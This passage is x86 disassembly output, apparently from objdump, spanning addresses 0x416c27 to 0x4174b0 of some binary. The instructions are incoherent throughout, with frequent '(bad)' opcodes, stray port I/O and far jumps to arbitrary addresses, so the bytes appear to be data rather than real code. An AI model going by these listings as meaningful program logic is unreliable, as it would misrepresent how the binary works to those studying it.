  416c27:	sub    BYTE PTR [edx],bl
  416c29:	pop    ds
  416c2a:	push   0x2b324c33
  416c2f:	mul    esi
  416c31:	xor    BYTE PTR [ecx+0x37],bl
  416c34:	sbb    eax,0xcd38481f
  416c39:	cmp    edx,DWORD PTR [ecx+0x19]
  416c3c:	out    0x57,eax
  416c3e:	xor    al,0x51
  416c40:	aaa    
  416c41:	cmp    eax,0x1efb3119
  416c46:	sub    BYTE PTR ds:0x214e5124,al
  416c4c:	or     edx,esi
  416c4e:	iret   
  416c4f:	and    BYTE PTR [eax],cl
  416c51:	xor    dl,bh
  416c53:	push   ebp
  416c54:	stos   DWORD PTR es:[edi],eax
  416c55:	and    al,BYTE PTR [esi]
  416c57:	es or  eax,0xe7312520
  416c5d:	push   edi
  416c5e:	cmp    DWORD PTR [eax],edi
  416c60:	shl    DWORD PTR [eax],cl
  416c62:	out    0x22,eax
  416c64:	mov    ebx,0xa5392d57
  416c69:	dec    edi
	...
  416c7a:	add    BYTE PTR [eax],al
  416c7c:	retf   0xa004
  416c7f:	and    eax,0x25b921e6
  416c84:	fnstenv [eax]
  416c86:	(bad)  
  416c87:	shl    BYTE PTR ds:[ebx+ecx*4],cl
  416c8b:	and    al,0xc8
  416c8d:	and    DWORD PTR [ecx+0x7d1da703],ebx
  416c93:	sub    ah,BYTE PTR [ecx+eiz*1+0x27cd407b]
  416c9a:	(bad)  
  416c9b:	push   ds
  416c9c:	mov    ebx,0xfd8c0036
  416ca1:	daa    
  416ca2:	outs   dx,BYTE PTR ds:[esi]
  416ca3:	jne    0x416c85
  416ca5:	dec    ebx
  416ca6:	ins    BYTE PTR es:[edi],dx
  416ca7:	pop    edx
  416ca8:	idiv   BYTE PTR [edi]
  416caa:	push   ecx
  416cab:	or     DWORD PTR [ecx-0x55d0dfb9],esi
  416cb1:	push   esp
  416cb2:	and    BYTE PTR [ecx],bh
  416cb4:	sbb    DWORD PTR [esi],esi
  416cb6:	jno    0x416cf6
  416cb8:	pop    ss
  416cb9:	aaa    
  416cba:	fs cmp bh,dh
  416cbd:	inc    eax
  416cbe:	push   eax
  416cbf:	sub    BYTE PTR [esi+0x44],al
  416cc2:	cmp    cl,BYTE PTR [ecx]
  416cc4:	(bad)  
  416cc5:	xor    al,0x71
  416cc7:	sbb    eax,0xa633717
  416ccc:	fsub   QWORD PTR [edi]
  416cce:	ins    BYTE PTR es:[edi],dx
  416ccf:	add    eax,0x155154f6
  416cd4:	fbstp  TBYTE PTR [esi]
  416cd6:	arpl   WORD PTR [edx],bp
  416cd8:	call   0x536cc04
  416cdd:	inc    esp
  416cde:	outs   dx,BYTE PTR ds:[esi]
  416cdf:	cli    
	...
  416cf0:	add    BYTE PTR [eax],al
  416cf2:	int    0x4b
  416cf4:	outs   dx,BYTE PTR ds:[esi]
  416cf5:	or     dh,ch
  416cf7:	add    al,0x0
  416cf9:	retf   0x33cb
  416cfc:	jo     0x416cd3
  416cfe:	mov    dh,ch
  416d00:	sub    eax,0x18d5cd
  416d05:	stos   BYTE PTR es:[edi],al
  416d06:	sub    esi,DWORD PTR [eax+esi*2]
  416d09:	mov    ebp,0xbb701abc
  416d0e:	push   ds
  416d0f:	xor    DWORD PTR [ebx-0x36],esp
  416d12:	or     eax,0x18b55f41
  416d17:	add    eax,0x4f9e900
  416d1c:	add    cl,ch
  416d1e:	stc    
  416d1f:	add    al,0x0
  416d21:	jmp    0xcd76abdf
  416d26:	xchg   ebp,eax
  416d27:	outs   dx,BYTE PTR ds:[esi]
  416d28:	int    0x0
  416d2a:	push   edx
  416d2b:	xor    BYTE PTR [ecx+0x0],bh
  416d2e:	leave  
  416d2f:	pop    es
  416d30:	gs inc esi
  416d32:	cmc    
  416d33:	inc    esi
  416d34:	dec    edx
  416d35:	aaa    
  416d36:	mov    edi,DWORD PTR [bp+si+0x12cf]
  416d3b:	ss jns 0x416d3e
  416d3e:	imul   eax,DWORD PTR [eax],0x42354665
  416d44:	dec    edx
  416d45:	aaa    
  416d46:	pop    es
  416d47:	pop    ebp
  416d48:	mov    edx,0x7937d2cf
  416d4d:	add    BYTE PTR [ecx-0x4ab99aff],cl
  416d53:	mov    dh,0xfd
  416d55:	inc    DWORD PTR [eax]
	...
  416d67:	add    bl,ah
  416d69:	popf   
  416d6a:	sub    eax,0x4f013b32
  416d6f:	outs   dx,DWORD PTR ds:[esi]
  416d70:	std    
  416d71:	in     al,dx
  416d72:	jb     0x416dd5
  416d74:	loope  0x416d51
  416d76:	pop    ebx
  416d77:	dec    ebp
  416d78:	cli    
  416d79:	loope  0x416dec
  416d7b:	outs   dx,DWORD PTR ds:[esi]
  416d7c:	mov    al,0xe7
  416d7e:	gs je  0x416d88
  416d81:	call   0xf32fe1f3
  416d86:	ins    DWORD PTR es:[edi],dx
  416d87:	gs (bad) 
  416d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d8a:	inc    edx
  416d8b:	js     0x416d40
  416d8d:	or     ch,BYTE PTR [ebx+0x72]
  416d90:	mov    esi,0xb5495bf0
  416d95:	repnz pusha 
  416d97:	ins    BYTE PTR es:[edi],dx
  416d98:	mov    bh,0x9
  416d9a:	inc    esi
  416d9b:	outs   dx,DWORD PTR ds:[esi]
  416d9c:	mov    cl,0xe5
  416d9e:	outs   dx,BYTE PTR ds:[esi]
  416d9f:	pop    esp
  416da0:	xor    dl,0x6a
  416da3:	jb     0x416dd7
  416da5:	fbld   TBYTE PTR [eax+0x32]
  416da8:	arpl   WORD PTR [esi],ax
  416daa:	add    BYTE PTR [eax],al
  416dac:	arpl   cx,sp
  416dae:	jmp    DWORD PTR [ecx+0x53]
  416db1:	(bad)  
  416db3:	xor    edx,edi
  416db5:	fwait
  416db6:	jmp    0xecdd5dba
  416dbb:	call   DWORD PTR [edi-0x1d001f65]
  416dc1:	fwait
  416dc2:	and    eax,DWORD PTR [eax]
  416dc4:	out    0x9b,al
  416dc6:	cli    
  416dc7:	jmp    esi
  416dc9:	fwait
  416dca:	cmc    
  416dcb:	inc    DWORD PTR [eax]
	...
  416ddd:	add    BYTE PTR [eax-0x3cffda65],bl
  416de3:	fwait
  416de4:	loopne 0x416de5
  416de6:	call   0xe99c:0x2efff69b
  416ded:	call   FWORD PTR [esi]
  416def:	pushf  
  416df0:	add    BYTE PTR es:[eax],ch
  416df3:	pushf  
  416df4:	repz jmp DWORD PTR [edx]
  416df7:	pushf  
  416df8:	icebp  
  416df9:	dec    DWORD PTR [ecx]
  416dfb:	pushf  
  416dfc:	and    eax,0x249c5800
  416e01:	add    BYTE PTR ds:0x500279c,cl
  416e07:	pushf  
  416e08:	add    DWORD PTR [eax],eax
  416e0a:	inc    edi
  416e0b:	add    eax,0xaf1d7225
  416e10:	and    ah,BYTE PTR [esi+0x2e]
  416e13:	or     ebx,DWORD PTR [ecx+0x67]
  416e16:	or     al,0xe5
  416e18:	and    DWORD PTR [ebx+0xe],esp
  416e1b:	sti    
  416e1c:	(bad)  
  416e1e:	pop    ss
  416e1f:	enter  0x3a31,0xd5
  416e23:	cli    
  416e24:	add    edx,DWORD PTR [ecx+0xd]
  416e27:	mov    edx,0xcddb7535
  416e2c:	sub    BYTE PTR [ebx+edi*4-0x49],bl
  416e30:	and    ah,BYTE PTR [edx-0x21]
  416e33:	xchg   DWORD PTR [esi+0x6d],eax
  416e36:	iret   
  416e37:	shl    BYTE PTR [edx],0x6e
  416e3a:	cli    
  416e3b:	mov    ds,WORD PTR [esp+esi*2]
  416e3e:	xlat   BYTE PTR ds:[ebx]
  416e3f:	add    al,0xba
  416e41:	sub    BYTE PTR [eax],al
	...
  416e53:	add    al,cl
  416e55:	xor    al,BYTE PTR [ebp+esi*1+0x1cba04cb]
  416e5c:	scas   al,BYTE PTR es:[edi]
  416e5d:	pop    ds
  416e5e:	mov    edx,0x8c32a828
  416e63:	xor    eax,0x4f82dfda
  416e68:	mov    dl,0x19
  416e6a:	jp     0x416ea3
  416e6c:	cli    
  416e6d:	push   ebp
  416e6e:	xor    BYTE PTR [edi],0x99
  416e71:	push   ebp
  416e72:	dec    esp
  416e73:	mov    WORD PTR ss:[edi],ds
  416e76:	pop    ecx
  416e77:	in     al,0xd8
  416e79:	and    BYTE PTR [ebx],dh
  416e7b:	pop    ecx
  416e7c:	pop    ecx
  416e7d:	and    esi,DWORD PTR [esi+esi*1]
  416e80:	pop    esi
  416e81:	add    eax,0x226e1b1a
  416e86:	sbb    ah,BYTE PTR [edi]
  416e88:	push   0x1a364c2f
  416e8d:	loop   0x416ed1
  416e8f:	push   eax
  416e90:	sub    BYTE PTR [edx],ah
  416e92:	adc    al,0x21
  416e94:	dec    esi
  416e95:	and    al,bh
  416e97:	inc    edi
  416e98:	push   ebp
  416e99:	xor    ecx,DWORD PTR [eiz*1+0x2b19182e]
  416ea0:	cli    
  416ea1:	push   ebx
  416ea2:	adc    BYTE PTR [eax],bh
  416ea4:	sbb    DWORD PTR [esp+eax*1+0x36],edx
  416ea8:	and    al,0x22
  416eaa:	stc    
  416eab:	jecxz  0x416e85
  416ead:	and    BYTE PTR [esi+edx*2+0x3d9220b],bh
  416eb4:	sub    ebx,DWORD PTR [esi]
  416eb6:	shl    DWORD PTR [esi],cl
	...
  416ec8:	add    BYTE PTR [eax],al
  416eca:	sub    esp,DWORD PTR [edx]
  416ecc:	fnstcw WORD PTR [ecx]
  416ece:	fnstenv [edx]
  416ed0:	pop    es
  416ed1:	out    0xd9,eax
  416ed3:	fstp   DWORD PTR [ebx+0x732d934]
  416ed9:	push   esp
  416eda:	mov    DWORD PTR [eax+eax*1],0x49490f0c
  416ee1:	les    esp,FWORD PTR [eax]
  416ee3:	es push 0x16e088
  416ee9:	mov    edx,0xba6330e0
  416eee:	fdiv   QWORD PTR [edx]
  416ef0:	jbe    0x416e76
  416ef2:	out    0xe4,eax
  416ef4:	and    cl,BYTE PTR [ebp-0x6ab9aa4b]
  416efa:	leave  
  416efb:	add    al,0x44
  416efd:	mov    ebp,?
  416eff:	xor    edi,DWORD PTR [eax-0x7c]
  416f02:	ret    
  416f03:	push   eax
  416f04:	push   eax
  416f05:	jmp    0x44b58ed8
  416f0a:	(bad)  
  416f0b:	(bad)  
  416f0c:	ja     0x416f52
  416f0e:	sbb    al,BYTE PTR ds:0xe5144455
  416f14:	inc    ebx
  416f15:	dec    eax
  416f16:	and    cl,BYTE PTR [eax+0x0]
  416f19:	sub    eax,0x4767221b
  416f1e:	fiadd  WORD PTR [ebx+0x5f]
  416f21:	xor    eax,0x38510519
  416f26:	cmp    ah,BYTE PTR [eax]
  416f28:	je     0x416f2e
  416f2a:	(bad)  
  416f2b:	and    DWORD PTR [ebp+0x1b],ebp
	...
  416f3e:	add    BYTE PTR [eax],al
  416f40:	adc    eax,0xa6c97448
  416f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f46:	jno    0x416f50
  416f48:	fcomp  QWORD PTR [eax]
  416f4a:	arpl   cx,bp
  416f4c:	shl    DWORD PTR [edi-0x586616d8],0x42
  416f53:	push   ds
  416f54:	cmp    BYTE PTR [esi+0x54],dl
  416f57:	mov    ebx,0xb54e4038
  416f5c:	stc    
  416f5d:	push   esp
  416f5e:	push   edx
  416f5f:	mov    al,ds:0xb051e834
  416f64:	stc    
  416f65:	push   ebx
  416f66:	dec    esi
  416f67:	add    BYTE PTR [edx+0x53455152],ch
  416f6d:	inc    eax
  416f6e:	dec    eax
  416f6f:	inc    ebp
  416f70:	mov    al,ds:0x6c45ffe8
  416f75:	push   ecx
  416f76:	inc    ecx
  416f77:	dec    ecx
  416f78:	xchg   esp,eax
  416f79:	inc    ebp
  416f7a:	add    BYTE PTR [eax],al
  416f7c:	outs   dx,DWORD PTR ds:[esi]
  416f7d:	in     al,0x62
  416f7f:	imul   edi,DWORD PTR [ebp-0x10],0xa916eff
  416f86:	arpl   WORD PTR [ecx-0x73],bp
  416f89:	push   esp
  416f8a:	jno    0x416ffe
  416f8c:	outs   dx,DWORD PTR ds:[esi]
  416f8d:	add    esi,DWORD PTR [eax+0x61]
  416f90:	nop
  416f91:	lock jb 0x417003
  416f94:	xchg   ecx,eax
  416f95:	fistp  WORD PTR [edx+0x76]
  416f98:	mov    dl,0xe4
  416f9a:	jo     0x417001
  416f9c:	adc    ebp,esp
  416f9e:	outs   dx,BYTE PTR ds:[esi]
  416f9f:	gs push ecx
  416fa1:	pop    es
  416fa2:	pop    ebp
  416fa3:	ins    DWORD PTR es:[edi],dx
	...
  416fb4:	add    BYTE PTR [eax],al
  416fb6:	ss ss jbe 0x41701b
  416fba:	dec    edi
  416fbb:	in     al,dx
  416fbc:	pusha  
  416fbd:	add    BYTE PTR ds:0xfc3a6fed,dh
  416fc3:	vpackuswb ymm0,ymm0,YMMWORD PTR [edi]
  416fc7:	in     eax,dx
  416fc8:	outs   dx,DWORD PTR ds:[esi]
  416fc9:	cmp    ch,BYTE PTR [edi+eax*8-0x13189803]
  416fd0:	outs   dx,DWORD PTR ds:[esi]
  416fd1:	jae    0x416f9c
  416fd3:	(bad)  
  416fd4:	sub    al,0x0
  416fd6:	fistp  QWORD PTR ds:0xe4f46f6b
  416fdc:	pusha  
  416fdd:	pop    esp
  416fde:	ror    BYTE PTR [eax],1
  416fe0:	jb     0x417051
  416fe2:	(bad)  
  416fe3:	(bad)  
  416fe5:	pop    ebx
  416fe6:	loopne 0x416ff0
  416fe8:	jb     0x417059
  416fea:	scas   al,BYTE PTR es:[edi]
  416feb:	or     DWORD PTR [ecx+0x6d],esi
  416fee:	xchg   ebx,eax
  416fef:	ss aas 
  416ff1:	push   0x6b1ec9fa
  416ff6:	xlat   BYTE PTR ds:[ebx]
  416ff7:	imul   ebx,DWORD PTR ds:0x529be973,0x6d
  416ffe:	aam    0x6f
  417000:	ss pop edi
  417002:	enter  0x4db8,0x41
  417006:	loop   0x417071
  417008:	push   ds
  417009:	imul   ebx,edi,0x6b
  41700c:	sbb    eax,0x3c9bc973
  417011:	outs   dx,BYTE PTR ds:[esi]
  417012:	test   eax,0x9e6c2487
  417017:	push   esi
  417018:	inc    ebp
  417019:	add    BYTE PTR [bx+si],al
	...
  41702c:	test   al,0x9b
  41702e:	dec    ebp
  41702f:	inc    edx
  417030:	test   al,0x76
  417032:	and    BYTE PTR [edi-0x71],ah
  417035:	add    BYTE PTR [ecx],0x5c
  417038:	mov    esp,0x88682284
  41703d:	dec    esi
  41703e:	pop    ds
  41703f:	arpl   dx,di
  417041:	out    0x40,eax
  417043:	ins    DWORD PTR es:[edi],dx
  417044:	addr16 aas 
  417046:	sub    BYTE PTR [ebp-0x6],ch
  417049:	xlat   BYTE PTR ds:[ebx]
  41704a:	push   ecx
  41704b:	ins    DWORD PTR es:[edi],dx
  41704c:	pop    ecx
  41704d:	push   ebx
  41704e:	aas    
  41704f:	arpl   WORD PTR [esi-0x10],cx
  417052:	add    ecx,DWORD PTR [ecx+0x27]
  417055:	loope  0x41707d
  417057:	ins    BYTE PTR es:[edi],dx
  417058:	push   edi
  417059:	out    0x1d,eax
  41705b:	add    BYTE PTR [esi],ah
  41705d:	repz fimul WORD PTR [edx+0x57]
  417061:	clc    
  417062:	es ins DWORD PTR es:[edi],dx
  417064:	and    al,0x9c
  417066:	dec    ebp
  417067:	push   eax
  417068:	sub    BYTE PTR [edi-0x6e998dd],ah
  41706e:	xor    BYTE PTR [eax],al
  417070:	aaa    
  417071:	lods   al,BYTE PTR ds:[esi]
  417072:	sbb    al,0x61
  417074:	cli    
  417075:	cmova  esi,DWORD PTR [eax+0x23]
  417079:	sti    
  41707a:	dec    edi
  41707b:	inc    ebx
  41707c:	or     al,BYTE PTR ds:0x51fa22d0
  417082:	shl    DWORD PTR [esp+ebx*8],cl
  417085:	push   ds
  417086:	add    al,0x46
  417088:	(bad)  
  417089:	push   esp
  41708a:	out    0x32,eax
  41708c:	fnsave [eax]
  41708e:	int3   
  41708f:	xor    al,BYTE PTR [eax]
	...
  4170a1:	add    BYTE PTR [esp+ebx*1],cl
  4170a4:	int    0x1c
  4170a6:	cli    
  4170a7:	dec    eax
  4170a8:	call   0xa603:0xba1fc61c
  4170af:	dec    esi
  4170b0:	nop
  4170b1:	xor    dl,ch
  4170b3:	and    DWORD PTR [esi-0x73c825e0],ecx
  4170b9:	daa    
  4170ba:	xchg   ebp,eax
  4170bb:	and    esp,edi
  4170bd:	fstp   QWORD PTR [edi-0x34fc88d0]
  4170c3:	add    al,0x84
  4170c5:	add    ecx,DWORD PTR [esi-0x6afc84fc]
  4170cb:	add    al,0x7d
  4170cd:	add    ebx,DWORD PTR [edi-0x5fba5fc]
  4170d3:	add    al,0x3b
  4170d5:	inc    ebp
  4170d6:	data16 xor al,0x49
  4170d9:	and    ebx,DWORD PTR [esi-0x1b]
  4170dc:	and    bl,BYTE PTR ds:0x1d53336f
  4170e2:	cmp    eax,0xfa324429
  4170e7:	aaa    
  4170e8:	and    al,0xde
  4170ea:	sub    al,0x17
  4170ec:	dec    edx
  4170ed:	sbb    al,0xfa
  4170ef:	dec    edx
  4170f0:	sbb    DWORD PTR [edi],esp
  4170f2:	dec    ebx
  4170f3:	sub    eax,0x54a5825
  4170f8:	lds    edx,FWORD PTR [eax+0x41]
  4170fb:	dec    ebx
  4170fc:	out    0x41,eax
  4170fe:	push   ss
  4170ff:	add    DWORD PTR es:[edi],esp
  417102:	xor    al,0x19
  417104:	test   DWORD PTR [ebx],0x0
	...
  417116:	add    BYTE PTR [eax],al
  417118:	or     ebp,DWORD PTR [esi]
  41711a:	add    ch,bh
  41711c:	aam    0xf2
  41711e:	arpl   WORD PTR [eax],cx
  417120:	ret    0x4c04
  417123:	enter  0x18ca,0x50
  417127:	enter  0x162a,0x75
  41712b:	(bad)  
  41712c:	sub    ebp,DWORD PTR [ecx]
  41712e:	add    BYTE PTR [ebp-0x578be9e8],bl
  417134:	adc    eax,0xac47229
  417139:	push   ss
  41713a:	add    BYTE PTR [ebp-0x6b8be9e8],ah
  417140:	or     ch,BYTE PTR [eax]
  417142:	jb     0x41712d
  417144:	std    
  417145:	inc    ebx
  417146:	jno    0x4170dd
  417148:	leave  
  417149:	xor    DWORD PTR [edx-0x63],esi
  41714c:	stc    
  41714d:	xor    eax,0x19ed876d
  417152:	pop    edi
  417153:	jnp    0x417129
  417155:	inc    eax
  417156:	inc    esi
  417157:	(bad)  
  417158:	fcom   DWORD PTR ds:0x43d49968
  41715e:	imul   ecx,DWORD PTR [ebp+0x635f30bb],0x59744ad5
  417168:	dec    edx
  417169:	arpl   WORD PTR ss:[ebp+0x32],bx
  41716d:	sub    al,0x6e
  41716f:	inc    esi
  417170:	sub    eax,DWORD PTR ds:0x441a2b5c
  417176:	jp     0x4171bc
  417178:	cmp    al,0x19
  41717a:	jo     0x417165
	...
  41718c:	add    BYTE PTR [eax],al
  41718e:	scas   eax,DWORD PTR es:[edi]
  41718f:	sub    DWORD PTR [eax+0x3d],esi
  417192:	dec    BYTE PTR [edx+0x54]
  417195:	cmp    DWORD PTR [ebx+0x112d2dec],esp
  41719b:	xor    ebp,DWORD PTR [ecx+0x35]
  41719e:	jmp    0x4171cc
  4171a0:	arpl   bp,di
  4171a2:	add    eax,0xa3006d41
  4171a7:	jmp    0x6d69:0x2005c6d
  4171ae:	add    al,BYTE PTR [ebx]
  4171b0:	fs add ah,bl
  4171b3:	add    DWORD PTR [esi+0x54],eax
  4171b6:	inc    ebx
  4171b7:	pop    es
  4171b8:	aas    
  4171b9:	outs   dx,DWORD PTR ds:[esi]
  4171ba:	inc    ebp
  4171bb:	add    DWORD PTR [ecx+0x63],esp
  4171be:	dec    edi
  4171bf:	(bad)  
  4171c0:	push   0x6e
  4171c2:	inc    eax
  4171c3:	shl    DWORD PTR [ecx+0x78],0x9f
  4171c7:	pop    es
  4171c8:	das    
  4171c9:	inc    esp
  4171ca:	push   es
  4171cb:	dec    ebx
  4171cc:	push   esp
  4171cd:	push   eax
  4171ce:	arpl   sp,dx
  4171d0:	fs je  0x417211
  4171d3:	aam    0x2d
  4171d5:	imul   esp,DWORD PTR [ebp-0x2],0x4b505bff
  4171dc:	sub    DWORD PTR [esi+0x6f],eax
  4171df:	aaa    
  4171e0:	add    BYTE PTR [eax+eiz*2-0x2],bl
  4171e4:	jae    0x41724b
  4171e6:	dec    edi
  4171e7:	jmp    0x7261:0x17c696e
  4171ee:	and    esi,DWORD PTR [ebx+ecx*2]
  4171f1:	inc    esi
	...
  417202:	add    BYTE PTR [eax],al
  417204:	outs   dx,DWORD PTR ds:[esi]
  417205:	cmp    BYTE PTR ds:0x3f4cce52,bh
  41720b:	ins    BYTE PTR es:[edi],dx
  41720c:	inc    edx
  41720d:	fisubr DWORD PTR [esi+0x65]
  417210:	push   eax
  417211:	dec    ebp
  417212:	push   esp
  417213:	jns    0x417258
  417215:	in     al,0x4b
  417217:	imul   esi,DWORD PTR [ecx],0xfa46774d
  41721d:	cwde   
  41721e:	xor    DWORD PTR [ebx],esi
  417220:	and    BYTE PTR [ecx-0x68e2d2cb],dh
  417226:	inc    ebx
  417227:	xor    ah,BYTE PTR [esi-0x1dced267]
  41722d:	mov    ebx,0xeefa333e
  417232:	jmp    0xe82f:0xf1b3ea2a
  417239:	in     eax,dx
  41723a:	cmc    
  41723b:	inc    ebp
  41723c:	into   
  41723d:	les    edi,FWORD PTR [edi]
  41723f:	inc    edx
  417240:	psubb  mm6,mm2
  417243:	sub    eax,0x5bf40fc8
  417248:	add    eax,0x283117b5
  41724d:	lods   al,BYTE PTR ds:[esi]
  41724e:	inc    eax
  41724f:	pop    edi
  417250:	jmp    0xca95b209
  417255:	stos   DWORD PTR es:[edi],eax
  417256:	inc    ebp
  417257:	dec    esi
  417258:	xlat   BYTE PTR ds:[ebx]
  417259:	pop    edi
  41725a:	push   esi
  41725b:	pop    edi
  41725c:	enter  0x17cc,0x65
  417260:	cli    
  417261:	or     DWORD PTR [esi+eiz*2],ebp
  417264:	retf   0xd7ab
  417267:	jno    0x417269
	...
  417279:	add    dh,dl
  41727b:	jnp    0x41727e
  41727d:	push   esp
  41727e:	mov    edi,0xc851385d
  417283:	popa   
  417284:	fisubr DWORD PTR [ecx]
  417286:	cli    
  417287:	jnp    0x4172ad
  417289:	jno    0x417234
  41728b:	and    bl,BYTE PTR [edx]
  41728d:	jb     0x41722d
  41728f:	retf   
  417290:	lock ror BYTE PTR cs:[ebp+0x1e8effeb],1
  417298:	and    BYTE PTR [edx-0x74],dh
  41729b:	dec    esp
  41729c:	pop    ss
  41729d:	arpl   WORD PTR [eax],si
  41729f:	aas    
  4172a0:	out    dx,al
  4172a1:	call   DWORD PTR [edi+0x41]
  4172a4:	sbb    BYTE PTR [edx+ebx*1+0x4d],ch
  4172a8:	and    BYTE PTR [eax+ebp*2+0x51],ah
  4172ac:	xor    eax,0xeddf1071
  4172b1:	call   FWORD PTR [edi]
  4172b3:	lods   al,BYTE PTR ds:[esi]
  4172b4:	dec    ebp
  4172b5:	inc    ebx
  4172b6:	sub    BYTE PTR [ecx],al
  4172b8:	push   ebp
  4172b9:	push   edx
  4172ba:	and    al,0x5
  4172bc:	(bad)  
  4172bd:	add    edi,DWORD PTR [ecx+edi*1]
  4172c0:	aaa    
  4172c1:	in     al,0x3f
  4172c3:	xor    bl,BYTE PTR [esi]
  4172c5:	add    al,0x3c
  4172c7:	cmp    DWORD PTR [edi],esi
  4172c9:	cmp    cl,BYTE PTR [edi]
  4172cb:	sbb    ah,bh
  4172cd:	ss sbb eax,0xdc370419
  4172d3:	sbb    al,0x4
  4172d5:	sbb    dl,bh
  4172d7:	xor    eax,0x3a26421e
  4172dc:	test   al,0x55
	...
  4172ee:	add    BYTE PTR [eax],al
  4172f0:	mov    ecx,0xd81ab940
  4172f5:	xor    DWORD PTR [edx+eax*2],eax
  4172f8:	into   
  4172f9:	xor    al,0x7
  4172fb:	test   DWORD PTR [edi],0xdb56a2da
  417301:	push   ss
  417302:	shl    BYTE PTR [ebx],1
  417304:	(bad)  
  417305:	adc    eax,0x4ab756e7
  41730a:	xchg   ebx,eax
  41730b:	push   edx
  41730c:	std    
  41730d:	lods   al,BYTE PTR ss:[esi]
  41730f:	inc    edi
  417310:	enter  0x8931,0x1a
  417314:	loope  0x417360
  417316:	mov    ebx,0xbcd5da53
  41731b:	repnz ror DWORD PTR [edx-0x65],0x53
  417320:	stos   DWORD PTR es:[edi],eax
  417321:	daa    
  417322:	jns    0x417355
  417324:	cdq    
  417325:	push   ss
  417326:	jp     0x41732b
  417328:	mov    esp,0xbae39738
  41732d:	xor    DWORD PTR [edx+ebx*1+0x6e],ebx
  417331:	add    eax,0xe54a5025
  417336:	sub    al,0x1b
  417338:	push   esi
  417339:	sub    al,BYTE PTR [eax+eiz*1]
  41733c:	cli    
  41733d:	xor    al,0x48
  41733f:	xor    eax,0x364e184b
  417344:	push   esi
  417345:	add    eax,0x12e51a00
  41734a:	jbe    0x417390
  41734c:	add    al,0x4f
  41734e:	pop    edi
  41734f:	adc    al,0x15
  417351:	add    eax,0x1a53
	...
  417366:	or     eax,0xfe2d4713
  41736b:	inc    edi
  41736c:	outs   dx,BYTE PTR ds:[esi]
  41736d:	add    dl,ch
  41736f:	daa    
  417370:	pop    edi
  417371:	adc    eax,0x472283a
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	sbb    BYTE PTR [ebp-0x5],ch
  41737a:	rol    BYTE PTR [eax+edx*2],1
  41737d:	inc    bh
  41737f:	sbb    BYTE PTR [esi-0x24],cl
  417382:	or     al,0x23
  417384:	arpl   bx,bx
  417386:	stc    
  417387:	xor    eax,0x242bdb63
  41738c:	jb     0x417343
  41738e:	adc    BYTE PTR ds:0x4e9e963,dl
  417394:	add    cl,ch
  417396:	or     BYTE PTR [edx+0x3f],cl
  417399:	jmp    0xacd09785
  41739e:	js     0x4173ea
  4173a0:	dec    esp
  4173a1:	(bad)  
  4173a2:	stos   DWORD PTR es:[edi],eax
  4173a3:	mov    bh,0x5
  4173a5:	dec    ecx
  4173a6:	pop    esi
  4173a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173a8:	ror    DWORD PTR [edi-0x24ffc814],1
  4173ae:	inc    ebx
  4173af:	shr    DWORD PTR ds:0x30f220bb,cl
  4173b5:	mov    dh,0xf9
  4173b7:	aam    0x9
  4173b9:	out    dx,eax
  4173ba:	add    ebp,ebp
  4173bc:	add    eax,0x502fce8
  4173c1:	jmp    0x1918:0x4e5104fe
  4173c8:	jne    0x417412
	...
  4173da:	add    BYTE PTR [eax],al
  4173dc:	sub    al,0x24
  4173de:	pop    esp
  4173df:	sbb    eax,0x5f2f01
  4173e4:	adc    BYTE PTR [ebx+0x54],al
  4173e7:	push   eax
  4173e8:	out    dx,eax
  4173e9:	cmp    DWORD PTR [ebp+0x74],esp
  4173ec:	ss test eax,0xe3fd614a
  4173f2:	bound  esp,QWORD PTR [ebp+0x11]
  4173f5:	or     DWORD PTR [eax+0x6f],ecx
  4173f8:	adc    ch,dl
  4173fa:	call   DWORD PTR [eax+eax*1+0x0]
  4173fe:	jb     0x417400
  417400:	jecxz  0x4173e5
  417402:	outs   dx,BYTE PTR ds:[esi]
  417403:	jae    0x4173a8
  417405:	xor    ebp,DWORD PTR [ebx+0x72]
  417408:	xchg   DWORD PTR [ebx],eax
  41740a:	push   edx
  41740b:	gs (bad) 
  41740d:	std    
  41740e:	jae    0x417475
  417410:	mov    bl,0xdf
  417412:	fs jb  0x417478
  417415:	inc    edi
  417416:	aas    
  417417:	jns    0x41745a
  417419:	(bad)  
  41741a:	jno    0x417480
  41741c:	inc    esi
  41741d:	call   0xff9e7488
  417422:	jo     0x417487
  417424:	sub    BYTE PTR [ebx],al
  417426:	jno    0x41749b
  417428:	fldcw  WORD PTR ss:0x65fd3c63
  41742f:	imul   esi,DWORD PTR [ebx+eax*1],0xef86733c
  417436:	jae    0x4174a1
  417438:	jge    0x41741e
  41743a:	pop    ds
  41743b:	outs   dx,BYTE PTR ds:[esi]
  41743c:	jb     0x417434
  41743e:	pusha  
  41743f:	cmp    eax,0x0
	...
  417450:	add    BYTE PTR [eax],al
  417452:	xor    DWORD PTR [ebx],eax
  417454:	and    al,BYTE PTR [eax]
  417456:	xchg   ebp,eax
  417457:	loop   0x4174c4
  417459:	jne    0x4174d1
  41745b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41745c:	pop    ds
  41745d:	add    BYTE PTR [eax-0x4],ah
  417460:	gs je  0x4173e7
  417463:	loop   0x4174d6
  417465:	gs aas 
  417467:	xor    ah,BYTE PTR [ebp+0x6d]
  41746a:	cmp    al,0xf7
  41746c:	push   ebx
  41746d:	popa   
  41746e:	cli    
  41746f:	aas    
  417470:	sbb    al,0x5f
  417472:	dec    edi
  417473:	lock push ebx
  417475:	jae    0x4174a5
  417477:	add    BYTE PTR [ebx+0x5c],cl
  41747a:	sub    DWORD PTR [ecx+0x31],ecx
  41747d:	jno    0x4174d2
  41747f:	inc    edi
  417480:	push   ss
  417481:	jno    0x41747d
  417483:	jecxz  0x417499
  417485:	jno    0x4174b5
  417487:	(bad)  
  417488:	and    ch,BYTE PTR [ebx+0x17]
  41748b:	lods   al,BYTE PTR ds:[esi]
  41748c:	push   eax
  41748d:	jno    0x4174ae
  41748f:	cli    
  417490:	xor    eax,0x4090f5f
  417495:	push   eax
  417496:	sbb    ebx,DWORD PTR [ebx-0x65e28ace]
  41749c:	sbb    eax,0x32072a00
  4174a1:	je     0x4174cf
  4174a3:	cdq    
  4174a4:	sbb    BYTE PTR [edx-0x21],ah
  4174a7:	mov    ecx,0xb9d75401
  4174ac:	sbb    BYTE PTR [edi-0x2c],ah
  4174af:	int3   
  4174b0:	adc    eax,0x20bbe354
	...
